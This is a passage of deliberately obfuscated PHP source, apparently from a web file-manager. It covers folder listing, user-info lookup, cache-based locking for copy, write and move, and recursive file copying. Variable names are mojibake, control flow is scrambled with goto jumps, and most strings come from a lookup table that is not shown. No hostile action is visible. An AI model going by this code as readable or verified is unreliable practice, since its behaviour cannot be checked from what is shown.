$EôË¢œáÑ[$EÑ†Ò…¨†¿[28]]; } else { if ($aÑ¸ Ë°‚é[$EÑ†Ò…¨†¿[387]] == self::TYPE_SYSTEM) { $EôË¢œáÑ = $this->sourceInfo($F…‰›š‘â[0], !0); $D¹ğˆª÷öß = $EôË¢œáÑ[$EÑ†Ò…¨†¿[28]]; } } } $D¹ğˆª÷öß = $D¹ğˆª÷öß ? $EÑ†Ò…¨†¿[8] . $D¹ğˆª÷öß . $EÑ†Ò…¨†¿[8] : $EÑ†Ò…¨†¿[8]; return $D¹ğˆª÷öß; } protected function _listAppendUser(&$CĞÜñÑÎÙ) { goto däòğƒ‹à÷; D•‹ò§¿Ó…: $b‰„ÈÙŒ¸ = array_merge($eéÎ¨å³“, $bƒ‘‘³ÀÑƒ); $fØäœå“›¹ = Model($dÇÏ…³„Í[494])->userListInfo($b‰„ÈÙŒ¸); foreach ($CĞÜñÑÎÙ as &$aˆ–ÛğÒÀ§) { $f¼Ê´Ôº¸ = $aˆ–ÛğÒÀ§[$dÇÏ…³„Í[394]]; $aˆ–ÛğÒÀ§[$dÇÏ…³„Í[394]] = $fØäœå“›¹[$f¼Ê´Ôº¸] ? $fØäœå“›¹[$f¼Ê´Ôº¸] : !1; $f¼Ê´Ôº¸ = $aˆ–ÛğÒÀ§[$dÇÏ…³„Í[395]]; $aˆ–ÛğÒÀ§[$dÇÏ…³„Í[395]] = $fØäœå“›¹[$f¼Ê´Ôº¸] ? $fØäœå“›¹[$f¼Ê´Ôº¸] : !1; if (isset($aˆ–ÛğÒÀ§[$dÇÏ…³„Í[433]]) && $aˆ–ÛğÒÀ§[$dÇÏ…³„Í[433]][$dÇÏ…³„Í[495]]) { $a ƒ••‘ = $GLOBALS[$dÇÏ…³„Í[6]][$dÇÏ…³„Í[84]][$dÇÏ…³„Í[496]]; if ($aˆ–ÛğÒÀ§[$dÇÏ…³„Í[433]][$dÇÏ…³„Í[497]] <= time() - $a ƒ••‘) { $this->metaSet($aˆ–ÛğÒÀ§[$dÇÏ…³„Í[385]], $dÇÏ…³„Í[495], null); $this->metaSet($aˆ–ÛğÒÀ§[$dÇÏ…³„Í[385]], $dÇÏ…³„Í[497], null); unset($aˆ–ÛğÒÀ§[$dÇÏ…³„Í[433]][$dÇÏ…³„Í[495]]); continue; } $FÔ™Ù¢´‘ = $aˆ–ÛğÒÀ§[$dÇÏ…³„Í[433]][$dÇÏ…³„Í[495]]; $aˆ–ÛğÒÀ§[$dÇÏ…³„Í[433]][$dÇÏ…³„Í[498]] = Model($dÇÏ…³„Í[494])->getInfoSimpleOuter($FÔ™Ù¢´‘); } } goto C”¨‘í˜±Ã; däòğƒ‹à÷: $dÇÏ…³„Í =& $_SERVER[úÎü]; $eéÎ¨å³“ = array_to_keyvalue($CĞÜñÑÎÙ, $dÇÏ…³„Í[33], $dÇÏ…³„Í[394]); $bƒ‘‘³ÀÑƒ = array_to_keyvalue($CĞÜñÑÎÙ, $dÇÏ…³„Í[33], $dÇÏ…³„Í[395]); goto D•‹ò§¿Ó…; C”¨‘í˜±Ã: unset($aˆ–ÛğÒÀ§); goto Fç–ç±Äš; Fç–ç±Äš: } public function parentLevelArray($AÈ©ÏâµÃ) { $BŸØèî®­Õ =& $_SERVER[úÎü]; $AÈ©ÏâµÃ = explode($BŸØèî®­Õ[47], trim($AÈ©ÏâµÃ, $BŸØèî®­Õ[47])); return array_remove_value($AÈ©ÏâµÃ, $BŸØèî®­Õ[485]); } public function listAll($DãŒé‹ÁË») { goto fÏ¦È¦í; c±×éì“ñª: $DùîÚ×ô·å = $B–ôİ¿ñŸ[503]; $B ¢”™ÁŞà = "\114\105\x46\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\151\x6f\137\146\x69\154\145\x20\x66\x69\154\145\x20\157\156\40\163\157\x75\x72\x63\x65\x2e\146\x69\154\145\111\x44\x20\75\40\146\x69\154\x65\56\146\151\154\x65\111\x44"; $Aµ•ì¸Š = $this->alias($B–ôİ¿ñŸ[504])->field($DùîÚ×ô·å)->where($dààáê¢²)->join($B ¢”™ÁŞà)->select(); goto dèÁ…†µ•Ù; dèÁ…†µ•Ù: $this->_listAppendAuth($Aµ•ì¸Š); $this->_listAppendUser($Aµ•ì¸Š); $this->_listAppendPath($Aµ•ì¸Š); goto EİÑó„¿®ô; EİÑó„¿®ô: $Aµ•ì¸Š = array_to_keyvalue($Aµ•ì¸Š, $B–ôİ¿ñŸ[385]); $A¶ç¢Š“Ïâ = "\57{$b¤Ø¼šì®é[$B–ôİ¿ñŸ[28]]}\x2f"; $A¶ç¢Š“Ïâ = $A¶ç¢Š“Ïâ == $B–ôİ¿ñŸ[484] ? $B–ôİ¿ñŸ[8] : $A¶ç¢Š“Ïâ; goto A£ã‹Ù‚; fÏ¦È¦í: $B–ôİ¿ñŸ =& $_SERVER[úÎü]; $b¤Ø¼šì®é = $this->sourceInfo($DãŒé‹ÁË»); $dààáê¢² = array($B–ôİ¿ñŸ[499] => array($B–ôİ¿ñŸ[500], $b¤Ø¼šì®é[$B–ôİ¿ñŸ[476]] . $DãŒé‹ÁË» . $B–ôİ¿ñŸ[501]), $B–ôİ¿ñŸ[502] => 0); goto c±×éì“ñª; A£ã‹Ù‚: $bâ˜ó¬¯ö¬ = array(); foreach ($Aµ•ì¸Š as $c¯ÀÁíÚ× => $DÃ©†…‹³‘) { goto eæ‰˜ªäÌÔ; Cñâ‘ø©Šß: $BÓê÷…©‡Ç = str_replace($B–ôİ¿ñŸ[484], $B–ôİ¿ñŸ[8], $BÓê÷…©‡Ç); $BÓê÷…©‡Ç = str_replace($B–ôİ¿ñŸ[484], $B–ôİ¿ñŸ[8], $BÓê÷…©‡Ç); $Dì‡ÚÂéŠÆ = array($B–ôİ¿ñŸ[403] => str_replace($B–ôİ¿ñŸ[484], $B–ôİ¿ñŸ[8], $BÓê÷…©‡Ç), $B–ôİ¿ñŸ[505] => intval($DÃ©†…‹³‘[$B–ôİ¿ñŸ[386]]), $B–ôİ¿ñŸ[407] => $this->pathInfoFilter($DÃ©†…‹³‘, !0)); goto D¥³Áœ£¨…; eæ‰˜ªäÌÔ: $d®×ê¯¥¶» = $this->parentLevelArray($DÃ©†…‹³‘[$B–ôİ¿ñŸ[476]]); array_shift($d®×ê¯¥¶»); $BÓê÷…©‡Ç = $A¶ç¢Š“Ïâ; goto Cºï˜øèÅš; Cºï˜øèÅš: for ($D°¶¬“ˆô = 0; $D°¶¬“ˆô < count($d®×ê¯¥¶»); $D°¶¬“ˆô++) { $BÓê÷…©‡Ç .= $Aµ•ì¸Š[$d®×ê¯¥¶»[$D°¶¬“ˆô]][$B–ôİ¿ñŸ[28]] . $B–ôİ¿ñŸ[8]; } $BÓê÷…©‡Ç .= $DÃ©†…‹³‘[$B–ôİ¿ñŸ[28]]; if ($DÃ©†…‹³‘[$B–ôİ¿ñŸ[386]]) { $BÓê÷…©‡Ç .= $B–ôİ¿ñŸ[8]; } goto Cñâ‘ø©Šß; D¥³Áœ£¨…: if (!$DÃ©†…‹³‘[$B–ôİ¿ñŸ[386]]) { $Dì‡ÚÂéŠÆ[$B–ôİ¿ñŸ[435]] = $DÃ©†…‹³‘[$B–ôİ¿ñŸ[435]]; $Dì‡ÚÂéŠÆ[$B–ôİ¿ñŸ[506]] = $DÃ©†…‹³‘[$B–ôİ¿ñŸ[75]]; } $bâ˜ó¬¯ö¬[] = $Dì‡ÚÂéŠÆ; goto b³Ğ¥’í; b³Ğ¥’í: } return $bâ˜ó¬¯ö¬; goto Aìº©–ˆØ±; Aìº©–ˆØ±: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($AŠùŞœ»ã…) { goto e°ãñÉÑí½; A›ã¢¨Íæ¾: $BÜ“×¦ä® = 1; $this->_lockEvent($AŠùŞœ»ã…, array($F¡»¹“ ³[508], $F¡»¹“ ³[509]), $BÜ“×¦ä®); $this->_lockParent($AŠùŞœ»ã…, array($F¡»¹“ ³[509]), $BÜ“×¦ä®); goto CÂ¡²øÒ«¡; CÂ¡²øÒ«¡: $this->_lockEvent($AŠùŞœ»ã…, array($F¡»¹“ ³[510], $F¡»¹“ ³[511]), $BÜ“×¦ä®); $this->_lockCheckEnd($F¡»¹“ ³[507], $AŠùŞœ»ã…); goto f·—ÅÈî; e°ãñÉÑí½: $F¡»¹“ ³ =& $_SERVER[úÎü]; if (!$this->allowLock()) { return; } $this->_lockCheck($F¡»¹“ ³[507], $AŠùŞœ»ã…); goto A›ã¢¨Íæ¾; f·—ÅÈî: } public function lockCopyEnd($FàÑÂêÂš) { $aõ½—â¿¶Ñ =& $_SERVER[úÎü]; if (!$this->allowLock()) { return; } $Fî°ÍèÕ† = 0; $this->_lockEvent($FàÑÂêÂš, array($aõ½—â¿¶Ñ[508], $aõ½—â¿¶Ñ[509]), $Fî°ÍèÕ†); $this->_lockParent($FàÑÂêÂš, array($aõ½—â¿¶Ñ[509]), $Fî°ÍèÕ†); $this->_lockEvent($FàÑÂêÂš, array($aõ½—â¿¶Ñ[510], $aõ½—â¿¶Ñ[511]), $Fî°ÍèÕ†); } public function lockWriteStart($A‚³ÙÙõ­, $DÈŒùÒÇÌ‘ = '') { goto bÉ¹íµ· ƒ; bÉ¹íµ· ƒ: $a¬—½–ëğ =& $_SERVER[úÎü]; if (!$this->allowLock()) { return; } $this->_lockCheck($a¬—½–ëğ[508], $A‚³ÙÙõ­); goto BíÈƒùÊ¦œ; BíÈƒùÊ¦œ: $eô¥Êò„» = 1; $this->_lockKey($a¬—½–ëğ[512] . $A‚³ÙÙõ­ . $a¬—½–ëğ[91] . $DÈŒùÒÇÌ‘, $eô¥Êò„»); $this->_lockEvent($A‚³ÙÙõ­, array($a¬—½–ëğ[507], $a¬—½–ëğ[509]), $eô¥Êò„»); goto DŸ™çÅé‘Ï; DŸ™çÅé‘Ï: $this->_lockParent($A‚³ÙÙõ­, array($a¬—½–ëğ[507], $a¬—½–ëğ[509]), $eô¥Êò„»); $this->_lockCheckEnd($a¬—½–ëğ[508], $A‚³ÙÙõ­); goto a®¦¹«¼…É; a®¦¹«¼…É: } public function lockWriteEnd($D®Ù¡…Èí, $D²¨èÑÎã = '') { $A„ëöù–ùÂ =& $_SERVER[úÎü]; if (!$this->allowLock()) { return; } $d¬³çà¤•Š = 0; $this->_lockKey($A„ëöù–ùÂ[512] . $D®Ù¡…Èí . $A„ëöù–ùÂ[91] . $D²¨èÑÎã, $d¬³çà¤•Š); $this->_lockEvent($D®Ù¡…Èí, array($A„ëöù–ùÂ[507], $A„ëöù–ùÂ[509]), $d¬³çà¤•Š); $this->_lockParent($D®Ù¡…Èí, array($A„ëöù–ùÂ[507], $A„ëöù–ùÂ[509]), $d¬³çà¤•Š); } public function lockMoveStart($AË¹©“’˜¨) { goto D¼…Ô½‘‹Ç; fÙ‘‹Ò§‡¿: $d¢­ôŒ¹¼ğ = 1; $this->_lockKey($bÚ´ˆá½¡‡[513] . $AË¹©“’˜¨, $d¢­ôŒ¹¼ğ); $this->_lockEvent($AË¹©“’˜¨, array($bÚ´ˆá½¡‡[507], $bÚ´ˆá½¡‡[508]), $d¢­ôŒ¹¼ğ); goto FÕƒ¡é£²÷; FÕƒ¡é£²÷: $this->_lockParent($AË¹©“’˜¨, array($bÚ´ˆá½¡‡[507], $bÚ´ˆá½¡‡[509]), $d¢­ôŒ¹¼ğ); $this->_lockEvent($AË¹©“’˜¨, array($bÚ´ˆá½¡‡[514], $bÚ´ˆá½¡‡[510], $bÚ´ˆá½¡‡[511]), $d¢­ôŒ¹¼ğ); $this->_lockCheckEnd($bÚ´ˆá½¡‡[509], $AË¹©“’˜¨); goto eï°¤™­Àá; D¼…Ô½‘‹Ç: $bÚ´ˆá½¡‡ =& $_SERVER[úÎü]; if (!$this->allowLock()) { return; } $this->_lockCheck($bÚ´ˆá½¡‡[509], $AË¹©“’˜¨); goto fÙ‘‹Ò§‡¿; eï°¤™­Àá: } public function lockMoveEnd($CŸùÔ˜ğõ) { goto AÑ¾Ö¨äë‘; A¹‰àÌÄ©: $this->_lockEvent($CŸùÔ˜ğõ, array($E§›ÈÇÙ†[514], $E§›ÈÇÙ†[510], $E§›ÈÇÙ†[511]), $F‘Ö‘ÚÆÎ„); goto DÆÂÁã­™À; fŞ›ó—¡: $this->_lockKey($E§›ÈÇÙ†[513] . $CŸùÔ˜ğõ, $F‘Ö‘ÚÆÎ„); $this->_lockEvent($CŸùÔ˜ğõ, array($E§›ÈÇÙ†[507], $E§›ÈÇÙ†[508]), $F‘Ö‘ÚÆÎ„); $this->_lockParent($CŸùÔ˜ğõ, array($E§›ÈÇÙ†[507], $E§›ÈÇÙ†[509]), $F‘Ö‘ÚÆÎ„); goto A¹‰àÌÄ©; AÑ¾Ö¨äë‘: $E§›ÈÇÙ† =& $_SERVER[úÎü]; if (!$this->allowLock()) { return; } $F‘Ö‘ÚÆÎ„ = 0; goto fŞ›ó—¡; DÆÂÁã­™À: } private function _lockCheck($B¨ì×Ö —†, $d»Ğ£ÖÛ Ô) { goto e˜Ï´‰‹; e¥¹ÉÂé‘: $this->_lockTimeStart[$fÔªÈÊ©] = timeFloat(); if (!is_array($aˆ®ÖÙÉ¹)) { return; } $dÚ„îÅ’Ê“ = LNG($C¯ÙÁ‘êã´[515]); goto BƒÑ²¾Š±¶; BƒÑ²¾Š±¶: CacheLock::setErrorMsg($C¯ÙÁ‘êã´[157] . htmlspecialchars($aˆ®ÖÙÉ¹[$C¯ÙÁ‘êã´[28]]) . $C¯ÙÁ‘êã´[493] . $dÚ„îÅ’Ê“); $this->_lockKey($fÔªÈÊ©, 1); $this->_lockKey($fÔªÈÊ©, 0); goto D–Ø¢Ê±¥; D–Ø¢Ê±¥: $bÈÓÇÀ—£ = array_reverse($this->parentLevelArray($aˆ®ÖÙÉ¹[$C¯ÙÁ‘êã´[476]])); foreach ($bÈÓÇÀ—£ as $B…ãã’ª‹İ) { $fÔªÈÊ© = $B¨ì×Ö —† . $C¯ÙÁ‘êã´[516] . $B…ãã’ª‹İ; if (CacheLock::lockGet($C¯ÙÁ‘êã´[517] . $fÔªÈÊ©)) { $aˆ®ÖÙÉ¹ = $this->sourceInfo($B…ãã’ª‹İ); CacheLock::setErrorMsg($C¯ÙÁ‘êã´[157] . htmlspecialchars($aˆ®ÖÙÉ¹[$C¯ÙÁ‘êã´[28]]) . $C¯ÙÁ‘êã´[493] . $dÚ„îÅ’Ê“); $this->_lockKey($fÔªÈÊ©, 1); $this->_lockKey($fÔªÈÊ©, 0); } } goto BŸ‚ÃóÂŸ¸; e˜Ï´‰‹: $C¯ÙÁ‘êã´ =& $_SERVER[úÎü]; $aˆ®ÖÙÉ¹ = $this->sourceInfo($d»Ğ£ÖÛ Ô); $fÔªÈÊ© = $B¨ì×Ö —† . $C¯ÙÁ‘êã´[91] . $d»Ğ£ÖÛ Ô; goto e¥¹ÉÂé‘; BŸ‚ÃóÂŸ¸: } private function _lockCheckEnd($fäàÂÕ¹, $Bà§ŒæÒ”¼) { goto fîÄåŠ­öÉ; aß‹ãù¡: if (!isset($this->_lockTimeStart[$bƒƒ±„‡§Î])) { return; } $BğèÉªÓíƒ = timeFloat() - $this->_lockTimeStart[$bƒƒ±„‡§Î]; unset($this->_lockTimeStart[$bƒƒ±„‡§Î]); goto e ±ĞôÛÇÈ; fîÄåŠ­öÉ: $CøŒ¾ĞØÎ =& $_SERVER[úÎü]; $bƒƒ±„‡§Î = $fäàÂÕ¹ . $CøŒ¾ĞØÎ[91] . $Bà§ŒæÒ”¼; CacheLock::setErrorMsg($CøŒ¾ĞØÎ[368]); goto aß‹ãù¡; e ±ĞôÛÇÈ: if ($BğèÉªÓíƒ > 0.5) { unset(self::$cacheSourceInfo[$CøŒ¾ĞØÎ[426] . $Bà§ŒæÒ”¼]); } $D‘Êù³œô = $this->sourceInfo($Bà§ŒæÒ”¼); if (!$D‘Êù³œô) { show_json(LNG($CøŒ¾ĞØÎ[101]), !1); } goto A¡¾ÖË”Û; A¡¾ÖË”Û: } private function _lockParent($E‚Ç°³£ï, $D›ˆàì•˜¸, $Dö‹¹¶¸­’) { if (!$this->autoLockSet) { return; } $a½Ê‡Í¿îÕ = $this->sourceInfo($E‚Ç°³£ï); if (!is_array($a½Ê‡Í¿îÕ)) { return; } $cÎÂ©¯ïòğ = array_reverse($this->parentLevelArray($a½Ê‡Í¿îÕ[$_SERVER[úÎü][476]])); foreach ($cÎÂ©¯ïòğ as $d¥æƒ…‹¯ô) { $this->_lockEvent($d¥æƒ…‹¯ô, $D›ˆàì•˜¸, $Dö‹¹¶¸­’); } } private function _lockEvent($FòÌË„ùÖ, $DªÍ­‚É¼Ì, $dŒ—Ø•‚ÒÃ) { $AÇÅ¢•”İ¼ =& $_SERVER[úÎü]; if (!$this->autoLockSet) { return; } foreach ($DªÍ­‚É¼Ì as $cµµŞŸ–ø‹) { $C§©‰‡‰Š† = $cµµŞŸ–ø‹ . $AÇÅ¢•”İ¼[91] . $FòÌË„ùÖ; if ($dŒ—Ø•‚ÒÃ && CacheLock::lockGet($AÇÅ¢•”İ¼[517] . $C§©‰‡‰Š†)) { continue; } $this->_lockKey($C§©‰‡‰Š†, $dŒ—Ø•‚ÒÃ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($d¹‚…ÄòÖƒ, $CšÒõ²àš = 1) { $C½Ø·ğÇË = $_SERVER[úÎü][517] . md5($d¹‚…ÄòÖƒ); if ($CšÒõ²àš) { if (isset(self::$_lockItemArr[$C½Ø·ğÇË])) { return; } self::$_lockItemArr[$C½Ø·ğÇË] = 1; CacheLock::lock($C½Ø·ğÇË, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$C½Ø·ğÇË])) { return; } unset(self::$_lockItemArr[$C½Ø·ğÇË]); CacheLock::unlock($C½Ø·ğÇË); } } public function isParentOf($D£³‡ÉÖŠ, $b¤æÄ˜¦ÏÈ) { goto a¥Ğø¥¹Ş; fËÚ“„‰ß©: $CËñÖè—Î = $c¨„Ú¼ëåæ[$d·ëÍŒÔğ[476]] . $c¨„Ú¼ëåæ[$d·ëÍŒÔğ[385]] . $d·ëÍŒÔğ[47]; $e„²Ôò»Ğ› = $a¬†Éç¡ƒ[$d·ëÍŒÔğ[476]] . $a¬†Éç¡ƒ[$d·ëÍŒÔğ[385]] . $d·ëÍŒÔğ[47]; $DÚºóÛ…ñÁ = strpos($e„²Ôò»Ğ›, $CËñÖè—Î) === 0; goto AÏºàí·Ç; a¥Ğø¥¹Ş: $d·ëÍŒÔğ =& $_SERVER[úÎü]; $c¨„Ú¼ëåæ = $this->sourceInfo($D£³‡ÉÖŠ); $a¬†Éç¡ƒ = $this->sourceInfo($b¤æÄ˜¦ÏÈ); goto fËÚ“„‰ß©; AÏºàí·Ç: return $DÚºóÛ…ñÁ; goto Eæñ›êâ–; Eæñ›êâ–: } private $targetIsDelete = 0; public function copy($fÚËâ’Æˆç, $D¹‡¡«“ö, $c˜ˆ‹ô·Ò‰ = REPEAT_REPLACE, $dèÕ‚ÒëÆ = '') { goto cùÌÀÚêé; cùÌÀÚêé: $C„˜ï±Ş‰ =& $_SERVER[úÎü]; $d‚¥ÒÄÅŒë = $this->sourceInfo($fÚËâ’Æˆç); $fœÈÕ‚ë = $this->sourceInfo($D¹‡¡«“ö); goto BÚâ¾¿ƒØ; eñŒùà‹¡: $this->targetIsDelete = intval($d‚¥ÒÄÅŒë[$C„˜ï±Ş‰[413]]); $fÅáÖ¹é³‘ = $this->fileNameExistCache($D¹‡¡«“ö, $d‚¥ÒÄÅŒë[$C„˜ï±Ş‰[28]]); $dœáàé†Ğ’ = $this->_copy($fÚËâ’Æˆç, $D¹‡¡«“ö, $c˜ˆ‹ô·Ò‰, $dÍ‘ …«à, !0, $dèÕ‚ÒëÆ); goto C–§£ÃÚ; AË²‘Êïé: if ($d‚¥ÒÄÅŒë[$C„˜ï±Ş‰[386]] == $C„˜ï±Ş‰[83] && $fÅáÖ¹é³‘ == $dœáàé†Ğ’) { $this->folderSizeResetChildren($fÅáÖ¹é³‘); } Model($C„˜ï±Ş‰[521])->addAll($dÍ‘ …«à[$C„˜ï±Ş‰[519]], array(), !0); if ($fÅáÖ¹é³‘ != $dœáàé†Ğ’ || $d‚¥ÒÄÅŒë[$C„˜ï±Ş‰[386]] == $C„˜ï±Ş‰[83]) { Model($C„˜ï±Ş‰[522])->eventCopy($dœáàé†Ğ’); } goto f´¶®¨£ğõ; C–§£ÃÚ: $this->_childrenListClear(); $this->lockCopyEnd($fÚËâ’Æˆç); $this->lockWriteEnd($D¹‡¡«“ö, $Eì×âº¾¶Õ); goto AË²‘Êïé; C‡öî†¨œ¯: $this->updateModifyTime($D¹‡¡«“ö); return $dœáàé†Ğ’; goto d™«˜å‘£‰; BÚâ¾¿ƒØ: if (!$d‚¥ÒÄÅŒë || !$fœÈÕ‚ë || $fœÈÕ‚ë[$C„˜ï±Ş‰[386]] != $C„˜ï±Ş‰[83]) { return !1; } if ($this->isParentOf($fÚËâ’Æˆç, $D¹‡¡«“ö)) { return !1; } $Eì×âº¾¶Õ = $dèÕ‚ÒëÆ ? $dèÕ‚ÒëÆ : $d‚¥ÒÄÅŒë[$C„˜ï±Ş‰[28]]; goto E ­É ñ¥ç; E ­É ñ¥ç: $this->lockCopyStart($fÚËâ’Æˆç); $this->lockWriteStart($D¹‡¡«“ö, $Eì×âº¾¶Õ); $dÍ‘ …«à = array($C„˜ï±Ş‰[518] => array(), $C„˜ï±Ş‰[519] => array(), $C„˜ï±Ş‰[520] => array()); goto eñŒùà‹¡; f´¶®¨£ğõ: $this->saveAll($dÍ‘ …«à[$C„˜ï±Ş‰[520]]); Model($C„˜ï±Ş‰[171])->linkAdd($dÍ‘ …«à[$C„˜ï±Ş‰[518]]); $this->folderSizeReset($D¹‡¡«“ö); goto C‡öî†¨œ¯; d™«˜å‘£‰: } private function _copy($B¡ÄŸĞ½Èù, $A²Ü×½ÎÜÍ, $E™ë……ïøÃ, &$Cƒ‘«Âé–, $Bˆãñô“£Î, $AÖÄ…ğç§ì = '') { goto dÔé‡«È¸ì; dÔé‡«È¸ì: $aóÌèÁ¶  =& $_SERVER[úÎü]; $eµ¬ˆµ™™ë = $this->sourceInfoCache($B¡ÄŸĞ½Èù); $DšÑ¹Ò·êî = $eµ¬ˆµ™™ë[$aóÌèÁ¶ [386]] == $aóÌèÁ¶ [83]; goto cÆê¯ã±”Ë; bñˆİé±ğ: if (!$BÙ¤ù¢¼¡”) { return $this->_copyCreate($B¡ÄŸĞ½Èù, $A²Ü×½ÎÜÍ, $E†®ŠÀòƒÆ, $Cƒ‘«Âé–); } $D‚ÑŠ¢­á = $BÙ¤ù¢¼¡”; if ($DšÑ¹Ò·êî) { if ($E™ë……ïøÃ == REPEAT_RENAME_FOLDER) { $E†®ŠÀòƒÆ = $this->fileNameAutoCache($A²Ü×½ÎÜÍ, $E†®ŠÀòƒÆ, $E™ë……ïøÃ, $DšÑ¹Ò·êî); $D‚ÑŠ¢­á = $this->_copyCreate($B¡ÄŸĞ½Èù, $A²Ü×½ÎÜÍ, $E†®ŠÀòƒÆ, $Cƒ‘«Âé–); } else { $eÕ´Ú½ä®¡ = $this->_childrenList($B¡ÄŸĞ½Èù); foreach ($eÕ´Ú½ä®¡ as $b È¹îß¸‡) { $this->_copy($b È¹îß¸‡[$aóÌèÁ¶ [385]], $BÙ¤ù¢¼¡”, $E™ë……ïøÃ, $Cƒ‘«Âé–, !1); } } } else { if ($E™ë……ïøÃ == REPEAT_RENAME || $E™ë……ïøÃ == REPEAT_RENAME_FOLDER) { $E†®ŠÀòƒÆ = $this->fileNameAutoCache($A²Ü×½ÎÜÍ, $E†®ŠÀòƒÆ, $E™ë……ïøÃ, $DšÑ¹Ò·êî); $D‚ÑŠ¢­á = $this->_copyCreate($B¡ÄŸĞ½Èù, $A²Ü×½ÎÜÍ, $E†®ŠÀòƒÆ, $Cƒ‘«Âé–); } else { if ($E™ë……ïøÃ == REPEAT_REPLACE) { $eÎÀò—äÎ = $this->sourceInfoCache($BÙ¤ù¢¼¡”); $D“é‡—•ù = $this->fileHistory($eÎÀò—äÎ, $eµ¬ˆµ™™ë[$aóÌèÁ¶ [435]], $eµ¬ˆµ™™ë[$aóÌèÁ¶ [77]]); if ($D“é‡—•ù) { $Cƒ‘«Âé–[$aóÌèÁ¶ [518]][] = $eµ¬ˆµ™™ë[$aóÌèÁ¶ [435]]; } } else { if ($E™ë……ïøÃ == REPEAT_SKIP) { } } } Hook::trigger($aóÌèÁ¶ [523], array($aóÌèÁ¶ [524], $eµ¬ˆµ™™ë, 0)); } goto C·à‘ãêˆÀ; cÆê¯ã±”Ë: $E†®ŠÀòƒÆ = $AÖÄ…ğç§ì ? $AÖÄ…ğç§ì : $eµ¬ˆµ™™ë[$aóÌèÁ¶ [28]]; $BÙ¤ù¢¼¡” = $this->fileNameExistCache($A²Ü×½ÎÜÍ, $E†®ŠÀòƒÆ); if ($Bˆãñô“£Î) { $this->_childrenAllMake($B¡ÄŸĞ½Èù); if ($DšÑ¹Ò·êî && $BÙ¤ù¢¼¡”) { $this->_childrenAllMake($BÙ¤ù¢¼¡”); } } goto bñˆİé±ğ; C·à‘ãêˆÀ: return $D‚ÑŠ¢­á; goto f´©£©Ø˜Ò; f´©£©Ø˜Ò: } private function _copyCreate($C¦Ù«Ğ¨¤, $cğÏŠøæ, $AàÏ°„‘„, &$C›”ôÀ¡) { goto c‘î‚‘Õ‰Ğ; E°—É¹ñ…Œ: $this->addAll($bè‡Ò…í, array(), !1); $bÀÊ‚©èƒ = $this->where(array($d²÷¯šŸ’[478] => $f…¸Šàù˜Ö))->select(); $e·³è¨‹‰ = $this->_childrenMakeRelation($B§µáéà¯, $bÀÊ‚©èƒ); goto E½³Ä¤¼Â; e¢‹‘æİÖ: if ($A·±ªØæµ¹[$d²÷¯šŸ’[386]] != $d²÷¯šŸ’[83]) { $C›”ôÀ¡[$d²÷¯šŸ’[518]][] = $A·±ªØæµ¹[$d²÷¯šŸ’[435]]; return $f…¸Šàù˜Ö; } $B§µáéà¯ = array(); $bè‡Ò…í = array(); goto Eï·ÁÃ¥™ñ; E½³Ä¤¼Â: $e·³è¨‹‰[$C¦Ù«Ğ¨¤] = $f…¸Šàù˜Ö; $dÅäó£Øåç = array(); $b½õœËŠŞ = array(); goto Dé¦®öÄõ; FÍ¢Öï‹ù„: $f…¸Šàù˜Ö = $this->add($B³Š·Úáóï); $C®™»‹áˆå = array($d²÷¯šŸ’[385] => $f…¸Šàù˜Ö, $d²÷¯šŸ’[28] => $AàÏ°„‘„); $this->_copyApplyMeta($C®™»‹áˆå, $C›”ôÀ¡); goto e¢‹‘æİÖ; Cîçëäâœ‘: $B³Š·Úáóï = $this->_makeItemData($A·±ªØæµ¹, $e‘Œ¬º§‘¢, $AàÏ°„‘„); Hook::trigger($d²÷¯šŸ’[525], $B³Š·Úáóï); Hook::trigger($d²÷¯šŸ’[526], array($d²÷¯šŸ’[527], $B³Š·Úáóï, 0)); goto FÍ¢Öï‹ù„; e¸´¡ëƒ‰: $this->chunkEventSet($d²÷¯šŸ’[532], array($d²÷¯šŸ’[533], $B³Š·Úáóï, $aÕØÅß¯‹)); $this->saveAll($b½õœËŠŞ); return $f…¸Šàù˜Ö; goto C‚·¾—ï; c‘î‚‘Õ‰Ğ: $d²÷¯šŸ’ =& $_SERVER[úÎü]; $A·±ªØæµ¹ = $this->sourceInfoCache($C¦Ù«Ğ¨¤); $e‘Œ¬º§‘¢ = $this->sourceInfoCache($cğÏŠøæ); goto Cîçëäâœ‘; Aî¶‰Âñ§ß: $c­ğ„¿îŸï = $this->sourceInfo($f…¸Šàù˜Ö); foreach ($B§µáéà¯ as $cóÙ¿Ú¢°) { $có»À™£ó = $this->_makeItemData($cóÙ¿Ú¢°, $c­ğ„¿îŸï, $cóÙ¿Ú¢°[$d²÷¯šŸ’[28]]); $có»À™£ó[$d²÷¯šŸ’[476]] = $cóÙ¿Ú¢°[$d²÷¯šŸ’[476]]; $bè‡Ò…í[] = $có»À™£ó; } $this->chunkEventSet($d²÷¯šŸ’[528], array($d²÷¯šŸ’[529], $B³Š·Úáóï, $aÕØÅß¯‹)); goto E°—É¹ñ…Œ; Eï·ÁÃ¥™ñ: $this->_childrenListAll($C¦Ù«Ğ¨¤, $B§µáéà¯); $aÕØÅß¯‹ = count($B§µáéà¯); if ($aÕØÅß¯‹ == 0) { return $f…¸Šàù˜Ö; } goto Aî¶‰Âñ§ß; Dé¦®öÄõ: foreach ($bÀÊ‚©èƒ as $cóÙ¿Ú¢°) { $E×ºÓÈìß… = $cóÙ¿Ú¢°[$d²÷¯šŸ’[385]]; $c±õ´ø‹• = $this->_childrenMatch($e·³è¨‹‰, $cóÙ¿Ú¢°, $c­ğ„¿îŸï); $dÅäó£Øåç[] = array($d²÷¯šŸ’[385], $E×ºÓÈìß…, $d²÷¯šŸ’[478], $c±õ´ø‹•[$d²÷¯šŸ’[478]]); $b½õœËŠŞ[] = array($d²÷¯šŸ’[385], $E×ºÓÈìß…, $d²÷¯šŸ’[476], $c±õ´ø‹•[$d²÷¯šŸ’[476]]); $this->_copyApplyMeta($cóÙ¿Ú¢°, $C›”ôÀ¡); if ($cóÙ¿Ú¢°[$d²÷¯šŸ’[386]] != $d²÷¯šŸ’[83]) { $C›”ôÀ¡[$d²÷¯šŸ’[518]][] = $cóÙ¿Ú¢°[$d²÷¯šŸ’[435]]; } } $this->chunkEventSet($d²÷¯šŸ’[530], array($d²÷¯šŸ’[531], $B³Š·Úáóï, $aÕØÅß¯‹)); $this->saveAll($dÅäó£Øåç); 